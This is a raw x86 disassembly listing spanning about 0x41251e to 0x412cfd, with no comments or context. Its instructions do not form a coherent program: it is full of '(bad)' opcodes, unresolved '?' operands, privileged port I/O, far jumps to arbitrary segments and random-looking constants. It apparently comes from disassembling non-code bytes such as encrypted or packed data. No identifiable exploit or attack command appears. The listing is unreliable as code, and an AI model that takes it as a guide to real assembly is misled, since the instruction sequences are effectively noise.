  41251e:	xor    al,0x7a
  412520:	sbb    eax,0xbf43ce05
  412525:	pop    esp
  412526:	push   edi
  412527:	xchg   edx,eax
  412528:	or     BYTE PTR [ebx],ch
  41252a:	cwde   
  41252b:	push   esi
  41252c:	stos   DWORD PTR es:[edi],eax
  41252d:	out    0x99,eax
  41252f:	xchg   esp,eax
  412530:	add    edx,edx
  412532:	lea    eax,[edi+0x26]
  412535:	xchg   ebp,eax
  412536:	mov    bl,0x60
  412538:	dec    ebp
  412539:	xor    DWORD PTR [ebx-0x6c],0x69
  41253d:	mov    esp,0x12763eae
  412542:	mov    ch,0xfb
  412544:	inc    edx
  412545:	je     0x412528
  412547:	push   ss
  412548:	std    
  412549:	fwait
  41254a:	cdq    
  41254b:	add    bh,ah
  41254d:	cld    
  41254e:	lods   eax,DWORD PTR ds:[esi]
  41254f:	out    0x8a,al
  412551:	inc    esi
  412552:	push   eax
  412553:	aam    0x85
  412555:	jle    0x4125b6
  412557:	dec    BYTE PTR [esp+ecx*2]
  41255a:	jne    0x41258e
  41255c:	repnz mov al,0x4a
  41255f:	mov    dl,0xfc
  412561:	jne    0x4124e9
  412563:	mov    dl,0x50
  412565:	jbe    0x4125c5
  412567:	adc    eax,DWORD PTR [eax]
  412569:	(bad)  
  41256a:	pushf  
  41256b:	mov    dl,0x56
  41256d:	retf   0x5596
  412570:	ret    
  412571:	and    eax,0x4aab65d3
  412576:	mov    eax,0xa44bc8a
  41257b:	sbb    al,0xa
  41257d:	jl     0x4125ce
  41257f:	mov    esp,0x43c90f1a
  412584:	pop    edx
  412585:	call   0x64b2:0xf38f58cf
  41258c:	scas   al,BYTE PTR es:[edi]
  41258d:	pushf  
  41258e:	and    ah,BYTE PTR [ecx+0x2b6ebec5]
  412594:	ret    
  412595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412596:	add    al,0xf8
  412598:	call   0x4ead58fd
  41259d:	push   0x6
  41259f:	lock mov edx,0x4be1202b
  4125a5:	mov    ds:0x631fdbc5,al
  4125aa:	scas   eax,DWORD PTR es:[edi]
  4125ab:	(bad)  
  4125ac:	and    BYTE PTR [esi-0x63],bl
  4125af:	xchg   esp,eax
  4125b0:	mov    dh,0x2a
  4125b2:	cmp    esi,DWORD PTR [ecx+0x10f38182]
  4125b8:	cld    
  4125b9:	ss fstp st(4)
  4125bc:	inc    edi
  4125bd:	jnp    0x412566
  4125bf:	mov    esi,DWORD PTR [ebp+eiz*1-0x3035e521]
  4125c6:	mov    ch,0x4d
  4125c8:	cmc    
  4125c9:	or     BYTE PTR [ebx-0x20466d7d],0x2
  4125d0:	cmp    eax,0x4eb1a5e6
  4125d5:	push   es
  4125d6:	fistp  WORD PTR [edi+0x6ffa0976]
  4125dc:	sbb    eax,0x90ac1f97
  4125e1:	bound  eax,QWORD PTR [esi]
  4125e3:	imul   ecx,DWORD PTR [eax],0x30abc66b
  4125e9:	mov    ch,0xca
  4125eb:	sti    
  4125ec:	(bad)  
  4125ed:	popf   
  4125ee:	pop    ds
  4125ef:	fild   WORD PTR [ebx+0x23]
  4125f2:	sbb    edi,ecx
  4125f4:	dec    ebp
  4125f5:	(bad)  
  4125f6:	jo     0x4125ce
  4125f8:	aad    0x75
  4125fa:	adc    eax,0x658cc19d
  4125ff:	push   cs
  412600:	sbb    al,BYTE PTR [ebx+0x24b80cc0]
  412606:	cmc    
  412607:	aam    0x87
  412609:	in     al,0xa8
  41260b:	inc    esi
  41260c:	sti    
  41260d:	push   0x5bc02334
  412612:	pusha  
  412613:	dec    edi
  412614:	popf   
  412615:	aaa    
  412616:	cmp    edx,DWORD PTR [ebp-0x56]
  412619:	repz sbb ebp,DWORD PTR [eax]
  41261c:	push   esi
  41261d:	out    dx,eax
  41261e:	stos   BYTE PTR es:[edi],al
  41261f:	adc    ecx,DWORD PTR [esi]
  412621:	clc    
  412622:	nop
  412623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412624:	xor    eax,0x5fefbaeb
  412629:	push   cs
  41262a:	aad    0xf2
  41262c:	push   es
  41262d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41262e:	jmp    0xd18c:0x77216b59
  412635:	(bad)  
  412636:	jle    0x412620
  412638:	mov    ecx,0x66ea53e5
  41263d:	and    ebp,DWORD PTR [ebp+0x59227ba2]
  412643:	pop    ecx
  412644:	adc    DWORD PTR [ebp+0x6b],ecx
  412647:	and    cl,BYTE PTR [esi+0xb]
  41264a:	sub    eax,DWORD PTR [ebp-0x5b]
  41264d:	push   ss
  41264e:	bound  ebp,QWORD PTR [esi+0x31]
  412651:	imul   bp,WORD PTR [ecx-0x60e817db],0xffa5
  412659:	es aas 
  41265b:	add    DWORD PTR ds:0x35e97b30,0x5a
  412662:	stc    
  412663:	cmp    al,0x8f
  412665:	or     al,0xbe
  412667:	ficom  DWORD PTR [ecx]
  412669:	add    al,0x62
  41266b:	sub    al,0xc
  41266d:	cmc    
  41266e:	lea    esp,[edx+0x1f5bb10]
  412674:	sbb    dh,BYTE PTR [ecx+edx*4-0x2e16d93a]
  41267b:	jmp    0x78080525
  412680:	mov    ecx,0xb3cd5279
  412685:	adc    edx,DWORD PTR cs:[ecx-0x7ce61558]
  41268c:	inc    esp
  41268d:	jle    0x4126e3
  41268f:	cmp    DWORD PTR ds:0x325d4d5a,esp
  412695:	retf   0x9dc0
  412698:	pop    esi
  412699:	jmp    0x9c1:0xa708de03
  4126a0:	sbb    al,0xf7
  4126a2:	test   al,0x72
  4126a4:	sets   BYTE PTR [edi]
  4126a7:	pop    eax
  4126a8:	mov    bl,0x85
  4126aa:	shl    BYTE PTR ds:[ecx-0x58],cl
  4126ae:	adc    DWORD PTR [ebp+edx*2-0x9c6a0bc],0x2f
  4126b6:	sub    BYTE PTR [ecx-0x3e41d22b],dh
  4126bc:	jp     0x412665
  4126be:	adc    esp,DWORD PTR [ebx]
  4126c0:	mov    edx,0xfde56ceb
  4126c5:	aas    
  4126c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c7:	test   al,dl
  4126c9:	inc    edi
  4126ca:	shl    ch,1
  4126cc:	or     BYTE PTR [edx+0x26],dh
  4126cf:	outs   dx,DWORD PTR ds:[esi]
  4126d0:	pushf  
  4126d1:	out    0xa6,al
  4126d3:	ja     0x412698
  4126d5:	mov    esi,0x64195072
  4126da:	cdq    
  4126db:	inc    ebx
  4126dc:	push   edx
  4126dd:	fidiv  DWORD PTR [ecx+esi*1]
  4126e0:	jmp    0xe9e6:0x60790982
  4126e7:	mov    ecx,0xa4432bee
  4126ec:	adc    cl,dh
  4126ee:	pusha  
  4126ef:	xor    ch,BYTE PTR [edi]
  4126f1:	in     al,0x3b
  4126f3:	cwde   
  4126f4:	mov    esp,0xe07cd4a5
  4126f9:	cli    
  4126fa:	in     eax,0x83
  4126fc:	push   ebp
  4126fd:	sub    esi,ebx
  4126ff:	int    0xd9
  412701:	inc    ebx
  412702:	div    DWORD PTR [esi]
  412704:	bound  esi,QWORD PTR [edi+0x7e7d5a42]
  41270a:	cs pop ebp
  41270c:	ja     0x4126c0
  41270e:	daa    
  41270f:	scas   eax,DWORD PTR es:[edi]
  412710:	imul   edi,DWORD PTR [ecx],0x2de8aef4
  412716:	or     eax,0xa15532b7
  41271b:	mov    ecx,0x19c61ec1
  412720:	and    BYTE PTR ds:0xa9a741cd,dh
  412726:	lea    ebx,[esi]
  412728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412729:	jb     0x412745
  41272b:	in     eax,dx
  41272c:	(bad)  
  41272d:	in     al,0xdc
  41272f:	outs   dx,BYTE PTR ds:[esi]
  412730:	loope  0x41277c
  412732:	lahf   
  412733:	add    ah,dh
  412735:	repnz add eax,0x29e640b5
  41273b:	push   edi
  41273c:	imul   esi,DWORD PTR [ecx],0x2a3dc9ba
  412742:	jne    0x4126f9
  412744:	shl    DWORD PTR [esi],cl
  412746:	fisttp QWORD PTR ds:0xa6b39d67
  41274c:	in     al,0x2c
  41274e:	mov    ds:0xb7c28265,eax
  412753:	ret    0x9842
  412756:	jo     0x4127c7
  412758:	sbb    eax,0x6729da3d
  41275d:	pop    ss
  41275e:	adc    ebp,DWORD PTR [edi]
  412760:	jmp    0x710a:0x4e903342
  412767:	cmp    eax,DWORD PTR ds:0x96c10770
  41276d:	ins    BYTE PTR es:[edi],dx
  41276e:	adc    ebx,eax
  412770:	sub    bl,BYTE PTR [ebx]
  412772:	mov    eax,0x837b95d9
  412777:	and    DWORD PTR [ebp+0x75c3be5],ebx
  41277d:	adc    eax,esi
  41277f:	and    eax,0x2f6ae8a9
  412784:	mov    BYTE PTR [ecx],cl
  412786:	shl    BYTE PTR [ebx+0x57],cl
  412789:	pop    edi
  41278a:	std    
  41278b:	fsub   DWORD PTR [esi]
  41278d:	or     DWORD PTR [esi+edi*4],0xa21f5f8d
  412794:	xor    esi,DWORD PTR [ebx+0x59]
  412797:	dec    ebp
  412798:	mov    bh,BYTE PTR [eax+0x28bb1dc0]
  41279e:	sbb    eax,DWORD PTR [edx+ebx*4+0x23]
  4127a2:	inc    ecx
  4127a3:	or     dh,BYTE PTR [ebp+0x14]
  4127a6:	jb     0x41279d
  4127a8:	push   ebx
  4127a9:	push   edi
  4127aa:	cld    
  4127ab:	mov    ch,0xa0
  4127ad:	jbe    0x412824
  4127af:	loopne 0x4127ce
  4127b1:	mov    ch,0x3d
  4127b3:	mov    al,0x2c
  4127b5:	lock mul DWORD PTR [edx-0x69]
  4127b9:	js     0x412746
  4127bb:	cmp    al,BYTE PTR [ecx]
  4127bd:	ins    BYTE PTR es:[edi],dx
  4127be:	and    ebp,DWORD PTR [esi]
  4127c0:	push   eax
  4127c1:	out    dx,eax
  4127c2:	daa    
  4127c3:	sub    DWORD PTR [ecx],esi
  4127c5:	ret    
  4127c6:	sub    ebp,eax
  4127c8:	or     BYTE PTR [ecx],cl
  4127ca:	retf   
  4127cb:	xchg   ecx,eax
  4127cc:	jmp    0xc0ac5ab5
  4127d1:	in     al,0x1c
  4127d3:	cmp    DWORD PTR [ecx+0x34],ecx
  4127d6:	call   0x42f4:0x9490a625
  4127dd:	sbb    DWORD PTR ds:0x499fbac3,ecx
  4127e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e4:	arpl   WORD PTR [edi+ebx*1],dx
  4127e7:	or     BYTE PTR [ebp+ecx*2-0x24f9e83a],bl
  4127ee:	stos   BYTE PTR es:[edi],al
  4127ef:	sar    DWORD PTR [ebx+0x7976f917],cl
  4127f5:	lock lds ecx,FWORD PTR [edx+0x450c776c]
  4127fc:	pusha  
  4127fd:	test   al,dl
  4127ff:	sbb    dh,BYTE PTR ds:0xad12a897
  412805:	mov    dl,BYTE PTR [esi+0x7bb38e6]
  41280b:	mov    ebx,0x92ae855e
  412810:	jns    0x4127cd
  412812:	jnp    0x412852
  412814:	inc    edi
  412815:	mov    eax,0x36b48fb
  41281a:	jp     0x4127b9
  41281c:	or     DWORD PTR [ecx-0x7cbcadd4],esp
  412822:	mov    esp,0x2b5c0b24
  412827:	push   esp
  412828:	lea    edi,[eax+ebp*1]
  41282b:	add    cl,BYTE PTR [edi+0x397d5386]
  412831:	inc    esi
  412832:	aad    0xd2
  412834:	not    DWORD PTR gs:[edx+0xf]
  412838:	mov    ?,WORD PTR [ebx+0x59]
  41283b:	mov    ch,0xd1
  41283d:	push   eax
  41283e:	fiadd  DWORD PTR [esi+0x59]
  412841:	aas    
  412842:	jo     0x4127f3
  412844:	adc    al,0xd6
  412846:	xor    eax,0x35bbe7c4
  41284b:	jmp    0x1dbc:0xee1c9482
  412852:	lods   eax,DWORD PTR ds:[esi]
  412853:	mov    esp,0xf85210ff
  412858:	push   ds
  412859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41285a:	push   0x907b6f0e
  41285f:	test   DWORD PTR [edi+0x584d4abf],eax
  412865:	sbb    dh,BYTE PTR [edx-0x4e]
  412868:	sub    DWORD PTR [ebx+0x17],edi
  41286b:	ret    
  41286c:	mov    eax,ds:0xb0525e7c
  412871:	outs   dx,BYTE PTR ds:[esi]
  412872:	ja     0x412809
  412874:	push   edi
  412875:	int3   
  412876:	inc    edx
  412877:	shl    DWORD PTR [ebp+0x13fbd36f],0x7
  41287e:	jnp    0x41286e
  412880:	push   ss
  412881:	js     0x412873
  412883:	punpckhdq mm0,QWORD PTR [eax+0x71a88792]
  41288a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41288b:	out    dx,al
  41288c:	lods   eax,DWORD PTR ds:[esi]
  41288d:	jmp    0xd575:0x7698b4b2
  412894:	out    dx,al
  412895:	stc    
  412896:	jge    0x412904
  412898:	in     al,dx
  412899:	jmp    0x4128c6
  41289b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41289c:	stc    
  41289d:	sar    DWORD PTR [esi+0x47],0x84
  4128a1:	sub    DWORD PTR [edx-0x73],esp
  4128a4:	mov    eax,0xc52a5b26
  4128a9:	mov    bh,0xcc
  4128ab:	loopne 0x41289a
  4128ad:	or     eax,0x9b6a5240
  4128b2:	and    BYTE PTR [eax+0x2a],bh
  4128b5:	mov    dh,0x5e
  4128b7:	xor    BYTE PTR [esi],bl
  4128b9:	ins    DWORD PTR es:[edi],dx
  4128ba:	push   ebp
  4128bb:	or     BYTE PTR [ecx+edi*2+0x76],ch
  4128bf:	mov    ebx,0x74dd9f88
  4128c4:	bound  esp,QWORD PTR [edx-0x2b]
  4128c7:	pop    eax
  4128c8:	xor    eax,0x6238da8d
  4128cd:	test   eax,0xf1c19aa4
  4128d2:	pop    eax
  4128d3:	popf   
  4128d4:	jns    0x4128cd
  4128d6:	ja     0x4128b7
  4128d8:	cs js  0x412861
  4128db:	test   BYTE PTR [edx],bh
  4128dd:	ret    0x7b4e
  4128e0:	cmp    eax,ecx
  4128e2:	sub    al,BYTE PTR [ecx]
  4128e4:	gs or  al,0x8a
  4128e7:	ins    BYTE PTR es:[edi],dx
  4128e8:	nop
  4128e9:	popa   
  4128ea:	xchg   esi,eax
  4128eb:	adc    DWORD PTR [eax-0x56],edx
  4128ee:	mov    al,ds:0xf15485f0
  4128f3:	inc    ecx
  4128f4:	imul   esp,DWORD PTR [eax-0x11],0xffffffa6
  4128f8:	pop    esp
  4128f9:	and    dh,BYTE PTR [ebp+0x7c43a6c9]
  4128ff:	push   0xffffff9c
  412901:	mov    ecx,0x51bd0190
  412906:	mov    WORD PTR [edi+0xaedf551],fs
  41290c:	push   esi
  41290d:	scas   eax,DWORD PTR es:[edi]
  41290e:	pop    esi
  41290f:	iret   
  412910:	cs push eax
  412912:	and    eax,0xef32355f
  412917:	mov    esp,0xf492adaa
  41291c:	push   ecx
  41291d:	je     0x41297c
  41291f:	and    eax,esi
  412921:	adc    BYTE PTR [edx],ah
  412923:	stos   DWORD PTR es:[edi],eax
  412924:	addr16 out dx,al
  412926:	cmc    
  412927:	stos   DWORD PTR es:[edi],eax
  412928:	xchg   esi,eax
  41292a:	daa    
  41292b:	out    0x59,eax
  41292d:	dec    eax
  41292e:	retf   0x860b
  412931:	ret    
  412932:	jns    0x41291b
  412934:	fsubp  st(7),st
  412936:	test   DWORD PTR [eax],0x5b4cda50
  41293c:	dec    esp
  41293d:	cld    
  41293e:	dec    ebp
  41293f:	or     eax,DWORD PTR [ecx+ecx*4+0x5af0b800]
  412946:	sbb    eax,0xdafa987a
  41294b:	retf   
  41294c:	sbb    DWORD PTR [eax+0x12],ebx
  41294f:	push   eax
  412950:	dec    edi
  412951:	test   al,0x7f
  412953:	test   DWORD PTR [edi+0x62],ebp
  412956:	shl    BYTE PTR [edi],cl
  412958:	aad    0x4f
  41295a:	(bad)  
  41295b:	jmp    0xffb8:0xab1a680b
  412962:	sti    
  412963:	fnstcw WORD PTR [edi+0x6f52e087]
  412969:	adc    BYTE PTR [edi],dh
  41296b:	in     eax,0xd1
  41296d:	sub    esi,DWORD PTR [ecx]
  41296f:	scas   al,BYTE PTR es:[edi]
  412970:	mov    esp,cs
  412972:	data16 mov bl,0x66
  412975:	mov    esp,0xf87a9150
  41297a:	lds    esp,FWORD PTR [edx+0x3e734c8c]
  412980:	cmp    BYTE PTR [ebp+eax*2-0x63],dl
  412984:	xor    DWORD PTR gs:[esi-0x4],eax
  412988:	je     0x4129ba
  41298a:	ret    0x4a2c
  41298d:	outs   dx,DWORD PTR ds:[esi]
  41298e:	add    BYTE PTR ds:0x74262f65,cl
  412994:	out    dx,eax
  412995:	imul   eax,DWORD PTR [ebp+0x57d82fe8],0xffffffe7
  41299c:	xchg   ebx,eax
  41299d:	test   BYTE PTR [ebx+0x1c],dh
  4129a0:	and    BYTE PTR [esi+0x63fb0db7],0x7a
  4129a7:	outs   dx,BYTE PTR ds:[esi]
  4129a8:	adc    bh,ah
  4129aa:	sbb    eax,0xf41746fc
  4129af:	xchg   edx,eax
  4129b0:	out    0x43,eax
  4129b2:	pop    esi
  4129b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129b4:	adc    eax,0xb107a13a
  4129b9:	push   esp
  4129ba:	jp     0x412941
  4129bc:	out    dx,al
  4129bd:	push   cs
  4129be:	inc    edx
  4129bf:	(bad)  
  4129c0:	dec    esp
  4129c1:	mov    ecx,fs
  4129c3:	(bad)  
  4129c4:	push   0x7f16b441
  4129c9:	inc    eax
  4129ca:	les    esp,FWORD PTR [edi-0x25]
  4129cd:	mov    cl,cl
  4129cf:	xchg   esp,eax
  4129d0:	pop    ebp
  4129d1:	sub    BYTE PTR [ecx+0x4eea2c8c],0xbd
  4129d8:	sti    
  4129d9:	add    DWORD PTR ds:0xc9c695e3,ecx
  4129df:	mov    dh,0x53
  4129e1:	xchg   DWORD PTR [ebx+0x11],ecx
  4129e4:	jns    0x4129b4
  4129e6:	hlt    
  4129e7:	int    0x5a
  4129e9:	mov    edx,0x2df439e3
  4129ee:	and    eax,DWORD PTR [ebx]
  4129f0:	pop    edi
  4129f1:	daa    
  4129f2:	sub    al,0xe9
  4129f4:	lods   eax,DWORD PTR ds:[esi]
  4129f5:	sbb    dl,bl
  4129f7:	xchg   ecx,eax
  4129f8:	jmp    0xe4c3:0xd8c92f19
  4129ff:	cmp    dh,dl
  412a01:	test   dl,ch
  412a03:	jo     0x412a38
  412a05:	adc    DWORD PTR [esi],esp
  412a07:	jg     0x412a6b
  412a09:	sub    al,0x98
  412a0b:	shr    BYTE PTR [eax+0xfbd78a0],0xe8
  412a12:	fcom   DWORD PTR [edi]
  412a14:	ror    BYTE PTR [edi-0xc],0xd6
  412a18:	rol    BYTE PTR [edi+0x765a4757],0x2f
  412a1f:	cmp    eax,DWORD PTR [bx]
  412a22:	inc    ebx
  412a23:	cld    
  412a24:	leave  
  412a25:	xlat   BYTE PTR ds:[ebx]
  412a26:	cmp    BYTE PTR [edi-0x79],dl
  412a29:	shl    BYTE PTR [esi+0x53],1
  412a2c:	pop    ds
  412a2d:	dec    edi
  412a2e:	hlt    
  412a2f:	cmp    dl,bl
  412a31:	fadd   DWORD PTR [ecx]
  412a33:	pop    es
  412a34:	jp     0x4129d9
  412a36:	mov    al,0xa8
  412a38:	xchg   edi,eax
  412a39:	gs and eax,0x8110d9bd
  412a3f:	sahf   
  412a40:	mov    eax,0xb6d9951c
  412a45:	lahf   
  412a46:	(bad)  
  412a47:	fild   WORD PTR [ebp-0x65]
  412a4a:	sub    eax,0x48091f70
  412a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a50:	and    DWORD PTR [ecx+0x2a],ebp
  412a53:	out    dx,al
  412a54:	mov    ebp,?
  412a56:	mov    WORD PTR [edi-0x2a59a8f5],ds
  412a5c:	test   ebp,0x89391e27
  412a62:	mov    edi,0x9dd1011f
  412a67:	lods   eax,DWORD PTR ds:[esi]
  412a68:	fs xchg ebp,eax
  412a6a:	emms   
  412a6c:	adc    DWORD PTR [esi+0x5e8fc989],0xc121127e
  412a76:	xor    dh,BYTE PTR [esi-0x48]
  412a79:	xchg   ebp,eax
  412a7a:	or     DWORD PTR [edi+0x3e],ecx
  412a7d:	sub    ebx,eax
  412a7f:	sbb    eax,0xd1323cd3
  412a84:	test   eax,0xb02b07
  412a89:	loope  0x412ac1
  412a8b:	out    0x6b,al
  412a8d:	or     cl,dl
  412a8f:	repz jl 0x412a60
  412a92:	sbb    BYTE PTR [eax],dh
  412a94:	and    BYTE PTR [bx+si-0x7f],0x99
  412a99:	push   0xffffffc1
  412a9b:	fwait
  412a9c:	call   0xb7a38e16
  412aa1:	les    edx,FWORD PTR [edx+0x44e781ea]
  412aa7:	sbb    al,0xed
  412aa9:	push   edi
  412aaa:	xor    edx,DWORD PTR [edx-0x67]
  412aad:	rcr    al,0xb2
  412ab0:	ret    0x1ba9
  412ab3:	inc    ebp
  412ab4:	(bad)  
  412ab5:	data16 mov bl,ah
  412ab8:	in     eax,0x2d
  412aba:	scas   eax,DWORD PTR es:[edi]
  412abb:	xor    esp,DWORD PTR [ebx+0x76]
  412abe:	mov    dh,0x57
  412ac0:	push   edx
  412ac1:	jl     0x412abc
  412ac3:	addr16 aaa 
  412ac5:	xchg   BYTE PTR [esi+edx*4-0x45],dl
  412ac9:	mov    ds:0x511daf22,eax
  412ace:	jmp    0xf0b3d790
  412ad3:	mul    eax
  412ad5:	cld    
  412ad6:	mov    eax,ds:0x9bc1223f
  412adb:	mov    dh,0xfa
  412add:	sbb    eax,0x13381f97
  412ae2:	dec    ebx
  412ae3:	pop    es
  412ae4:	inc    ebp
  412ae5:	push   edi
  412ae6:	mov    edi,0x2b6e2f70
  412aeb:	xlat   BYTE PTR ds:[ebx]
  412aec:	xor    BYTE PTR [eax+0x10],0x74
  412af0:	jns    0x412a79
  412af2:	sahf   
  412af3:	cmp    edx,DWORD PTR [ebx+0x5e2ca45b]
  412af9:	inc    esi
  412afa:	xlat   BYTE PTR ds:[ebx]
  412afb:	fwait
  412afc:	mov    BYTE PTR [edi-0xadf8fc3],dl
  412b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b03:	icebp  
  412b04:	add    eax,0x5323cd67
  412b09:	inc    ecx
  412b0a:	adc    eax,0xae255727
  412b0f:	mov    ch,0x34
  412b11:	aas    
  412b12:	sahf   
  412b13:	enter  0xebfe,0xea
  412b17:	ins    DWORD PTR es:[edi],dx
  412b18:	loopne 0x412b8f
  412b1a:	xchg   esi,eax
  412b1b:	pop    ecx
  412b1c:	mov    ah,dh
  412b1e:	enter  0xcbd8,0x28
  412b22:	push   edx
  412b23:	sbb    al,al
  412b25:	sub    edi,ecx
  412b27:	loop   0x412ad4
  412b29:	inc    ebx
  412b2a:	in     eax,dx
  412b2b:	push   edx
  412b2c:	stc    
  412b2d:	push   ecx
  412b2e:	jmp    0x412b1b
  412b30:	cmp    BYTE PTR ds:0xc8da36d8,al
  412b36:	fsin   
  412b38:	mov    ds:0xe541b44c,eax
  412b3d:	stos   BYTE PTR es:[edi],al
  412b3e:	out    0xdd,al
  412b40:	or     BYTE PTR [ecx],al
  412b42:	push   ebx
  412b43:	ja     0x412b0e
  412b45:	jns    0x412b68
  412b47:	test   eax,0xab52085f
  412b4c:	stos   BYTE PTR es:[edi],al
  412b4d:	imul   esi,DWORD PTR [edx+eax*4+0x2b],0xffffffa1
  412b52:	pop    ds
  412b53:	test   BYTE PTR [edx+0x7fe87520],ch
  412b59:	sbb    eax,0x7d77fbcd
  412b5e:	arpl   WORD PTR [eax+ebx*2+0x722aee91],ax
  412b65:	cld    
  412b66:	mov    ds:0x79f8e013,al
  412b6b:	cld    
  412b6c:	cmp    DWORD PTR [edx],edi
  412b6e:	pop    ebp
  412b6f:	mov    ds:0x87fed8aa,eax
  412b74:	test   eax,0xdcf45e22
  412b79:	in     al,0xb4
  412b7b:	mov    dl,0xda
  412b7d:	add    DWORD PTR ss:[ebx-0x72],ebp
  412b81:	push   edx
  412b82:	lds    esp,FWORD PTR [esi-0x4aad5d72]
  412b88:	lods   eax,DWORD PTR ds:[esi]
  412b89:	popf   
  412b8a:	aaa    
  412b8b:	int3   
  412b8c:	bound  ebp,QWORD PTR [ebx+ecx*4+0x5b]
  412b90:	out    dx,al
  412b91:	in     al,dx
  412b92:	icebp  
  412b93:	xor    DWORD PTR [eax+0x1c],edi
  412b96:	stos   DWORD PTR es:[edi],eax
  412b97:	push   esp
  412b98:	lahf   
  412b99:	inc    ebp
  412b9a:	xchg   cx,ax
  412b9c:	xor    WORD PTR [edx+0x45dd2f13],bp
  412ba3:	inc    ecx
  412ba4:	inc    esi
  412ba5:	mov    DWORD PTR ds:0x91d00e9,eax
  412bab:	cmp    al,BYTE PTR [esi-0x3f7d3fbb]
  412bb1:	scas   al,BYTE PTR es:[edi]
  412bb2:	in     eax,0xc
  412bb4:	push   eax
  412bb5:	push   ds
  412bb6:	inc    edi
  412bb7:	xor    esi,DWORD PTR ds:0xa3137162
  412bbd:	xchg   esi,eax
  412bbe:	fdivr  st(5),st
  412bc0:	rcl    DWORD PTR [esi+0x76622fe2],1
  412bc6:	adc    al,0x56
  412bc8:	test   DWORD PTR [ebp+ebx*2-0x35],0xc4112b2d
  412bd0:	in     eax,0x15
  412bd2:	popa   
  412bd3:	mov    dl,0xb9
  412bd5:	cmp    al,0x6b
  412bd7:	popa   
  412bd8:	and    eax,0xdcd09c9f
  412bdd:	(bad)  
  412bde:	cmp    BYTE PTR [edx+ebx*4-0x596a4bfd],dl
  412be5:	in     al,dx
  412be6:	fwait
  412be7:	jg     0x412bf8
  412be9:	imul   esp
  412beb:	bound  edi,QWORD PTR [edx+0x52156cb4]
  412bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf2:	sbb    eax,0x8268300f
  412bf7:	retf   0x1b72
  412bfa:	fldenv [esi+0x5c]
  412bfd:	mov    ds:0xb801b6dc,eax
  412c02:	(bad)  
  412c03:	hlt    
  412c04:	lods   al,BYTE PTR ds:[esi]
  412c05:	adc    BYTE PTR [edx-0x5dc37bf7],0xf3
  412c0c:	mov    edx,0x14f3d385
  412c11:	sbb    eax,0xae107e9a
  412c17:	outs   dx,BYTE PTR ds:[esi]
  412c18:	jns    0x412c96
  412c1a:	inc    edi
  412c1b:	call   0xeae3:0x4d6ead13
  412c22:	push   edx
  412c23:	sbb    dl,bl
  412c25:	push   esp
  412c26:	xchg   edi,eax
  412c27:	lods   eax,DWORD PTR ds:[esi]
  412c28:	jle    0x412bdf
  412c2a:	mov    bl,0x6d
  412c2c:	jno    0x412bc5
  412c2e:	adc    BYTE PTR [eax-0x604b87b5],bh
  412c34:	imul   edx,ebp,0xffffffd7
  412c37:	xchg   ebp,eax
  412c38:	jp     0x412c1a
  412c3a:	push   esi
  412c3b:	inc    ecx
  412c3c:	pop    ebp
  412c3d:	push   ebx
  412c3e:	bound  ecx,QWORD PTR [esp+ebp*8]
  412c41:	pop    ss
  412c42:	push   0xa
  412c44:	ret    0xe7aa
  412c47:	out    dx,eax
  412c48:	pop    ds
  412c49:	push   eax
  412c4a:	fstp   TBYTE PTR [edx+0x4767f8ea]
  412c50:	cmc    
  412c51:	das    
  412c52:	sbb    al,0x9
  412c54:	push   es
  412c55:	pop    ebx
  412c56:	or     eax,edx
  412c58:	das    
  412c59:	mov    ebp,0x93c02c5c
  412c5e:	add    edx,DWORD PTR [edx-0x75]
  412c61:	add    bl,BYTE PTR [eax+0x73]
  412c64:	and    al,0xe2
  412c66:	xor    eax,0xc6688681
  412c6b:	and    al,0x4a
  412c6d:	xchg   DWORD PTR [eax],edx
  412c6f:	adc    al,0xf1
  412c71:	xor    ebp,edx
  412c73:	dec    ecx
  412c74:	shr    ah,1
  412c76:	fcom   DWORD PTR [ebx-0x41]
  412c79:	lock pushf 
  412c7b:	sbb    DWORD PTR [esi+0x2c],ebp
  412c7e:	out    dx,al
  412c7f:	xchg   ecx,ebp
  412c81:	jmp    0xb6fb:0x30eae238
  412c88:	imul   dl
  412c8a:	(bad)  
  412c8b:	arpl   WORD PTR [ecx+0x66],sp
  412c8e:	mov    ecx,0x10a5aff1
  412c93:	mov    al,0x13
  412c95:	lods   eax,DWORD PTR ds:[esi]
  412c96:	and    al,0xc8
  412c98:	int    0x48
  412c9a:	stos   DWORD PTR es:[edi],eax
  412c9b:	or     DWORD PTR [edx+0x3483afc8],esp
  412ca1:	push   edi
  412ca2:	and    dl,BYTE PTR [edi+0x5c7b5e76]
  412ca8:	aas    
  412ca9:	mov    al,0x93
  412cab:	imul   edi,DWORD PTR [edx+0xb],0x35
  412caf:	pop    ebp
  412cb0:	lock and DWORD PTR [ecx-0x26947163],edx
  412cb7:	out    0x2e,al
  412cb9:	and    eax,0xcd1f94aa
  412cbe:	fsubr  QWORD PTR [ecx-0x4e8394be]
  412cc4:	push   0x798fee17
  412cc9:	mov    DWORD PTR [ebp+0x3b],esp
  412ccc:	call   0xa56f:0x61c1fa2d
  412cd3:	arpl   WORD PTR [ebx+ebp*4+0x316cf530],cx
  412cda:	mov    cl,0x80
  412cdc:	jnp    0x412ca7
  412cde:	or     eax,0xc3ff314
  412ce3:	loopne 0x412c7b
  412ce5:	inc    edx
  412ce6:	adc    DWORD PTR [edi],esp
  412ce8:	out    0x5,eax
  412cea:	out    dx,eax
  412ceb:	or     al,0x94
  412ced:	mov    esi,0xc66be6ca
  412cf2:	lods   eax,DWORD PTR ds:[esi]
  412cf3:	xchg   DWORD PTR [eax+edx*1],ecx
  412cf6:	and    al,cl
  412cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cf9:	test   BYTE PTR [ebx],ch
  412cfb:	cli    
  412cfc:	xchg   esp,eax
  412cfd:	out    0x34,al
